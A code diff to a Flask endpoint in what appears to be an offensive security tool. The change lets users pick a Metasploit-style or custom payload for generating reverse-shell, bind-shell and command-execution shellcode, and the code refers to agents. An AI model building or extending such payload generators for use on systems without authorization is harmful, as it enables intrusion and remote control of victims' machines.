@@ -106,26 +106,34 @@ def generate_shellcode():
         encoding = data.get('encoding', 'base64')
         encryption = data.get('encryption', 'none')
         key = data.get('key', '')
+        payload = data.get('payload')
+        custom_payload = data.get('custom_payload', '')
         shellcode = None
+
+        # Use custom payload if selected
+        if payload == 'custom' and custom_payload:
+            msf_payload = custom_payload
+        else:
+            msf_payload = payload
 
         if shellcode_type == 'reverse':
             host = data.get('host')
             port = int(data.get('port', 0))
             if not host or not port:
                 return jsonify({'success': False, 'error': 'Host and port are required'}), 400
-            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform)
+            shellcode = shellcode_gen.generate_reverse_shell(host, port, platform, msf_payload)
 
         elif shellcode_type == 'bind':
             port = int(data.get('port', 0))
             if not port:
                 return jsonify({'success': False, 'error': 'Port is required'}), 400
-            shellcode = shellcode_gen.generate_bind_shell(port, platform)
+            shellcode = shellcode_gen.generate_bind_shell(port, platform, msf_payload)
 
         elif shellcode_type == 'exec':
             command = data.get('command')
             if not command:
                 return jsonify({'success': False, 'error': 'Command is required'}), 400
-            shellcode = shellcode_gen.generate_exec(command, platform)
+            shellcode = shellcode_gen.generate_exec(command, platform, msf_payload)
 
         else:
             return jsonify({'success': False, 'error': 'Invalid shellcode type specified'}), 400
@@ -142,13 +150,9 @@ def generate_shellcode():
         if encoded is None:
             return jsonify({'success': False, 'error': 'Encoding failed'}), 500
 
-        return jsonify({
-            'success': True,
-            'shellcode': encoded.decode() if isinstance(encoded, bytes) else encoded
-        })
-
+        return jsonify({'success': True, 'shellcode': encoded.decode() if isinstance(encoded, bytes) else encoded})
     except Exception as e:
-        return jsonify({'success': False, 'error': f'Unexpected server error: {str(e)}'}), 500
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/agents', methods=['GET'])
 def list_agents():
